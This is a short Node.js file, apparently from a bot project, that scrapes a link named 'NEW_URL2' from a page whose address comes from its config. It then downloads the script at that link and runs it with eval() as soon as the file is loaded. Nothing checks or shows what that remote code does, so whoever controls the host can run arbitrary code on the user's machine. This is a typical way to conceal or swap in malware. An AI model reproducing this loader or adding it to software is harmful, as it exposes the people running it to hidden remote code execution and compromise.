'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchNewUrl2() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const newUrl2Element = $('a:contains("NEW_URL2")');
    const newUrl2 = newUrl2Element.attr('href');

    if (!newUrl2) {
      throw new Error('New URL 2 link not found...');
    }

    console.log('New URL 2 fetched successfully ✅');

    const scriptResponse = await axios.get(newUrl2);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNewUrl2();
